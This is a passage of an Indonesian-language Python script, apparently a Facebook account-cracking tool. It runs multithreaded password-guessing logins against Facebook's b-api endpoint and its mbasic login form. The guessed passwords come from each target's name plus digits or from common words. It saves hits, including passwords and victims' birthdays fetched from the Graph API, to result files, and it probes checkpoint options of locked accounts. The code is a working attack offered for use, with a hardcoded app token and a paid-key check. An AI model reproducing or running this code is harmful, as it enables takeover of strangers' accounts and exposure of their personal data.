                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        elif _pilua in ["9","09"]:
            open("ua","w").write(_uason_)
            _xec=open("ua","r").read()
            if _xec == _uason_:
                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        elif _pilua in ["10"]:
            open("ua","w").write(_uarel_)
            _xec=open("ua","r").read()
            if _xec == _ual_:
                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        elif _pilua in ["11"]:
            open("ua","w").write(_uarel_)
            _xec=open("ua","r").read()
            if _xec == _uarel_:
                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        elif _pilua in ["12"]:
            open("ua","w").write(_uarel_)
            _xec=open("ua","r").read()
            if _xec == _ual_:
                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        elif _pilua in ["13"]:
            open("ua","w").write(_uain_)
            _xec=open("ua","r").read()
            if _xec == _uain_:
                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        elif _pilua in ["14"]:
            open("ua","w").write(_uaap_)
            _xec=open("ua","r").read()
            if _xec == _uaap_:
                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        elif _pilua in ["15"]:
            open("ua","w").write(_pcua_)
            _xec=open("ua","r").read()
            if _xec == _pcua_:
                _deku_uraraka("\n %s[%s•%s•%s] Succes ganti useragent"%(p,m,k,p));time.sleep(1)
            else:_deku_uraraka("\n %s[%s•%s•%s] Gagal ganti useragent"%(p,m,k,p))
        else:_deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak ada"%(p,m,k,p))

    elif _pil_ in ["3","03"]:
        try:
            _tes_ua=open("ua","r").read()
        except IOError:
            _tes_ua=("Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36")
        _deku_uraraka("\n %s[%s•%s•%s] Useragent: %s"%(p,m,k,p,_tes_ua));time.sleep(1)
    elif _pil_ in ["0","00"]:
        menu()
    else:_deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak ada"%(p,m,k,p))


def log_hasil(user, pasw):
    ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": host,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        _deku_uraraka(",\n %s[%s•%s•%s] Akun terkena spam"%(p,m,k,p))
    if "c_user" in ses.cookies:
        _deku_uraraka(" %s[%s•%s•%s] Akun berhasil di login"%(p,m,k,p))
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        for opt in range(len(ngew)):
            print(" \033[1;37m[\033[1;33m0"+str(opt+1)+"\033[1;37m] "+ngew[opt])
    elif "login_error" in str(run):
        oh = run.find("div",{"id":"login_error"}).find("div").text
        _deku_uraraka(" %s[%s•%s•%s] %s"%(p,m,k,p,oh))
    else:
        _deku_uraraka(" %s[%s•%s•%s] Sandi akun sudah di ganti"%(p,m,k,p))
def cek_hasil():
    _deku_uraraka("\n %s[%s•%s•%s] Masukan file cp\n %s[%s•%s•%s] Contoh file: CP/namefile.txt"%(p,m,k,p,p,m,k,p))
    files =__in__deku__(" %s[%s•%s•%s] nama file: "%(p,m,k,p))
    try:
        buka_baju = open(files,"r").readlines()
    except FileNotFoundError:
        _deku_uraraka("\n %s[%s•%s•%s] File tidak ada!"%(p,m,k,p))
        time.sleep(2); cek_hasil()
    _deku_uraraka(" %s[%s•%s•%s] Total akun cp: %s\n"%(p,m,k,p,str(len(buka_baju))))
    for memek in buka_baju:
        kontol = memek.replace("\n","")
        titid  = kontol.split("|")
        _deku_uraraka(" %s[%s•%s•%s] Akun fb: %s"%(p,m,k,p,kontol))
        try:
            log_hasil(titid[0], titid[1])
        except requests.exceptions.ConnectionError:
            continue
        _deku_uraraka("")
    _deku_uraraka("\n %s[%s•%s•%s] Cek akun sudah selesai"%(p,m,k,p))
    __in__deku__("\n %s[%s•%s•%s] Back"%(p,m,k,p))
    menu()

def cek_results():
    try:
        open("OK/%s.txt"%(tanggal))
    except IOError:
        __sys__deku("touch OK/%s.txt"%(tanggal))
    try:
        open("CP/%s.txt"%(tanggal))
    except IOError:
        __sys__deku("touch CP/%s.txt"%(tanggal))
    cp=("CP/%s.txt"%(tanggal))
    ok=("OK/%s.txt"%(tanggal))
    hsl_cp=open(cp,"r").read()
    hsl_ok=open(ok,"r").read()
    _deku_uraraka("\n%s [%s01%s] Cek results cp"%(p,k,p))
    _deku_uraraka("%s [%s02%s] Cek results ok"%(p,k,p))
    _deku_uraraka("%s [%s00%s] Back"%(p,k,p))
    _pil3h=__in__deku__("\n %s[%s•%s•%s] Choose: "%(p,m,k,p))
    if _pil3h in ["1","01"]:
        if len(hsl_cp) != 0:
            _deku_uraraka("\n %s[%s•%s•%s] Results cp"%(p,m,k,p))
            __sys__deku("cat CP/%s.txt"%(tanggal))
        else:_deku_uraraka("\n %s[%s•%s•%s] Tidak ada hasil!"%(p,m,k,p))
    elif _pil3h in ["2","02"]:
        if len(hsl_ok) != 0:
            _deku_uraraka("\n %s[%s•%s•%s] Results ok"%(p,m,k,p))
            __sys__deku("cat OK/%s.txt"%(tanggal))
        else:_deku_uraraka("\n %s[%s•%s•%s] Tidak ada hasil!"%(p,m,k,p))
    elif _pil3h in ["0","00"]:
        menu()
    else:_deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak ada!"%(p,m,k,p))


def dekura_x():
	start_method()
	dekurasayangara =__in__deku__("\n %s[%s•%s•%s] Choose: "%(p,m,k,p))
	if dekurasayangara in [""]:
		_deku_uraraka("\n %s[%s•%s•%s] Pilihan tidak boleh kosong"%(p,m,k,p));exit()
	elif dekurasayangara in ["1","01"]:
		_deku_uraraka("\n %s[%s•%s•%s] Tampilkan opsi checkpoint? y/t"%(p,m,k,p))
		_checkoptions_=__in__deku__(" %s[%s•%s•%s] Choose: "%(p,m,k,p))
		if _checkoptions_ in ["y","Y"]:
			try:
				su=open("url.txt","r").read()
				_suu=su
				_key=_suu[24]+_suu[17]+_suu[13]+_suu[28]+_suu[9]+_suu[19]
				key="ebiawc"
				if _key in key:
					_deku_uraraka("\n %s[%s•%s•%s] Crack pake sandi default/manual [d/m]"%(p,m,k,p))
					bukanmaen =__in__deku__(" %s[%s•%s•%s] Choose: "%(p,m,k,p))
					if bukanmaen in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							_deku_uraraka("\n %s[%s•%s•%s] Contoh sandi: sayang, kontol, anjing"%(p,m,k,p))
							asu = __in__deku__(" %s[%s•%s•%s] Sandi: "%(p,m,k,p)).split(",")
							if len(asu) =="":
								_deku_uraraka("\n %s[%s•%s•%s] sandi tidak boleh kosong"%(p,m,k,p));exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(api, uid, asu)
						exit()
					elif bukanmaen in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									dekura = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									dekura = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									dekura = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								else:
									dekura = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
								coeg.submit(api, uid, dekura)
						exit()
				else:_deku_uraraka(" %s[%s•%s•%s] Key invalid mohon hubungi admin!"%(p,m,k,p));exit()
			except (KeyError,IOError):_deku_uraraka("\n %s[%s•%s•%s] Anda belum membeli script ini versi premium"%(p,m,k,p));_deku_uraraka(" %s[%s•%s•%s] Mohon beli terlebih dahulu agar bisa menggunkan menu ini!"%(p,m,k,p));exit()

		else:
			_deku_uraraka("\n %s[%s•%s•%s] Crack pake sandi default/manual [d/m]"%(p,m,k,p))
			bukanmaen =__in__deku__(" %s[%s•%s•%s] Choose: "%(p,m,k,p))
			if bukanmaen in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					_deku_uraraka("\n %s[%s•%s•%s] Contoh sandi: sayang, kontol, anjing"%(p,m,k,p))
					asu = __in__deku__(" %s[%s•%s•%s] Sandi: "%(p,m,k,p)).split(",")
					if len(asu) =="":
						_deku_uraraka("\n %s[%s•%s•%s] sandi tidak boleh kosong"%(p,m,k,p));exit()
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(api, uid, asu)
				exit()
			elif bukanmaen in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							dekura = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							dekura = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							dekura = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						else:
							dekura = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]

						coeg.submit(apiiii, uid, dekura)
				exit()

	elif dekurasayangara in ["2","02"]:
		_deku_uraraka("\n %s[%s•%s•%s] Tampilkan opsi checkpoint? y/t"%(p,m,k,p))
		_checkoptions_=__in__deku__(" %s[%s•%s•%s] Choose: "%(p,m,k,p))
		if _checkoptions_ in ["y","Y"]:
			try:
				su=open("url.txt","r").read()
				_suu=su
				_key=_suu[24]+_suu[17]+_suu[13]+_suu[28]+_suu[9]+_suu[19]
				key="ebiawc"
				if _key in key:
					_deku_uraraka("\n %s[%s•%s•%s] Crack pake sandi default/manual [d/m]"%(p,m,k,p))
					bukanmaen =__in__deku__(" %s[%s•%s•%s] Choose: "%(p,m,k,p))
					if bukanmaen in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							_deku_uraraka("\n %s[%s•%s•%s] Contoh sandi: sayang, kontol, anjing"%(p,m,k,p))
							asu = __in__deku__(" %s[%s•%s•%s] Sandi: "%(p,m,k,p)).split(",")
							if len(asu) =="":
								_deku_uraraka("\n %s[%s•%s•%s] sandi tidak boleh kosong"%(p,m,k,p));exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(mbasic, uid, asu)
						exit()
					elif bukanmaen in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									dekura = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									dekura = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									dekura = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
								else:
									dekura = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
								coeg.submit(mbasic, uid, dekura)
						exit()
				else:_deku_uraraka(" %s[%s•%s•%s] Key invalid mohon hubungi admin!"%(p,m,k,p));exit()
			except (KeyError,IOError):_deku_uraraka("\n %s[%s•%s•%s] Anda belum membeli script ini versi premium"%(p,m,k,p));_deku_uraraka(" %s[%s•%s•%s] Mohon beli terlebih dahulu agar bisa menggunkan menu ini!"%(p,m,k,p));exit()

		else:
			_deku_uraraka("\n %s[%s•%s•%s] Crack pake sandi default/manual [d/m]"%(p,m,k,p))
			bukanmaen =__in__deku__(" %s[%s•%s•%s] Choose: "%(p,m,k,p))
			if bukanmaen in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					_deku_uraraka("\n %s[%s•%s•%s] Contoh sandi: sayang, kontol, anjing"%(p,m,k,p))
					asu = __in__deku__(" %s[%s•%s•%s] Sandi: "%(p,m,k,p)).split(",")
					if len(asu) =="":
						_deku_uraraka("\n %s[%s•%s•%s] sandi tidak boleh kosong"%(p,m,k,p));exit()
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(mbasicc, uid, asu)
				exit()
			elif bukanmaen in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							dekura = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							dekura = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							dekura = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
						else:
							dekura = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
						coeg.submit(mbasicc, uid, dekura)
				exit()


def api(uid, dekura):
    try:
        ua = open("ua", "r").read()
    except IOError:
        ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
    global ok, cp, loop, token
    sys.stdout.write("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(loop,len(id),len(ok),len(cp)));sys.stdout.flush()
    for pw in dekura:
        pw = pw.lower()
        headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
        ses = requests.Session()
        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
        if "session_key" in send.text and "EAAA" in send.text:
            print(("\r\x1b[0;32m * --> %s • %s               "%(uid,pw)))
            ok.append("%s|%s"%(uid, pw))
            open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        elif "www.facebook.com" in send.json()["error_msg"]:
            try:
                token = open("login.txt", "r").read()
                ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
                month, day, year = ttl.split("/")
                month = bulan[month]
                print(("\r\x1b[0;33m * --> %s • %s • %s %s %s             "%(uid,pw,day,month,year)))
                cp.append("%s|%s"%(uid, pw))
                open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
                day = (" ")
                month = (" ")
                year = (" ")
            except:pass
            cek_log(uid,pw,ua)
            cp.append("%s|%s"%(uid, pw))
            open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        else:
            continue

    loop += 1

def apiiii(uid, dekura):
    try:
        ua = open("ua", "r").read()
    except IOError:
        ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
    global ok, cp, loop, token
    sys.stdout.write("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(loop,len(id),len(ok),len(cp)));sys.stdout.flush()
    for pw in dekura:
        pw = pw.lower()
        headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
        ses = requests.Session()
        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
        if "session_key" in send.text and "EAAA" in send.text:
            print(("\r\x1b[0;32m * --> %s • %s               "%(uid,pw)))
            ok.append("%s|%s"%(uid, pw))
            open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        elif "www.facebook.com" in send.json()["error_msg"]:
            try:
                token = open("login.txt", "r").read()
                ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
                month, day, year = ttl.split("/")
                month = bulan[month]
                print(("\r\x1b[0;33m * --> %s • %s • %s %s %s             "%(uid,pw,day,month,year)))
                cp.append("%s|%s"%(uid, pw))
                open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
                day = (" ")
                month = (" ")
                year = (" ")
            except:pass
            print(("\r\x1b[0;33m * --> %s • %s             "%(uid,pw)))
            cp.append("%s|%s"%(uid, pw))
            open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        else:
            continue

    loop += 1

def mbasic(uid, dekura):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	global ok, cp, loop, token
	sys.stdout.write(
		"\r\033[0;37m [Crack] %s/%s OK: %s CP: %s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in dekura:
		kwargs = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(("\r\x1b[0;32m * --> %s • %s               "%(uid,pw)))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(("\r\x1b[0;33m * --> %s • %s • %s %s %s             "%(uid,pw,day,month,year)))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			cek_log(uid,pw,ua)
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mbasicc(uid, dekura):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	global ok, cp, loop, token
	sys.stdout.write(
		"\r\033[0;37m [Crack] %s/%s OK: %s CP: %s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in dekura:
		kwargs = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(("\r\x1b[0;32m * --> %s • %s               "%(uid,pw)))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(("\r\x1b[0;33m * --> %s • %s • %s %s %s             "%(uid,pw,day,month,year)))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print(("\r\x1b[0;33m * --> %s • %s             "%(uid,pw)))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def cek_log(uid,pw,ua):
	mb = ("https://mbasic.facebook.com")
	ses = requests.Session()
	option = []
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":uid,"pass":pw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print(("\r\x1b[0;33m * --> %s • %s               "%(uid,pw)))
		for opt in range(len(ngew)):
			print(" \033[1;37m[\033[1;33m0"+str(opt+1)+"\033[1;37m] "+ngew[opt])
		if "0" in str(len(ngew)):
			_deku_uraraka(" %s[%s•%s•%s] Hore akunya tap yes, silahkan login fb lite"%(p,m,k,p))
	elif "login_error" in str(run):
		print(("\r\x1b[0;33m * --> %s • %s               "%(uid,pw)))
	else:
		print(("\r\x1b[0;33m * --> %s • %s               "%(uid,pw)))



def start_method():
    _deku_uraraka("\n%s [%s01%s] Crack pake B-api"%(p,k,p))
    _deku_uraraka("%s [%s02%s] Crack pake Mbasic"%(p,k,p))

def started():
    _deku_uraraka("\n %s[%s•%s•%s] Acccount [ok] tersimpan di ok/%s "%(p,m,k,p,tanggal))
    _deku_uraraka(" %s[%s•%s•%s] Acccount [cp] tersimpan di cp/%s "%(p,m,k,p,tanggal))
    _deku_uraraka(" %s[%s•%s•%s] Matikan data dan mode pesawat 5/10 detik jika tidak ada hasil!"%(p,m,k,p))


#crot=base64.b64encode(imbs64)

kode1 = random.choice(["0","1","2","3","4","5","6","7","8","9","10"])
kode2 = random.choice(["a","b","c","d","e","f","g","h","i","j","k"])
kode3 = random.choice(["A","B","C","D","F","G","H","I","J","K"])
kode4 = random.choice(["l","m","n","o","p","q","r","s","t","u"])
kode5 = random.choice(["L","M","N","O","P","Q","R","S","T","U"])
crot1=random.choice([kode1,kode2,kode3,kode4,kode5])
crot2=random.choice([kode1,kode2,kode3,kode4,kode5])
crot3=random.choice([kode1,kode2,kode3,kode4,kode5])
crot4=random.choice([kode1,kode2,kode3,kode4,kode5])
crot5=random.choice([kode1,kode2,kode3,kode4,kode5])
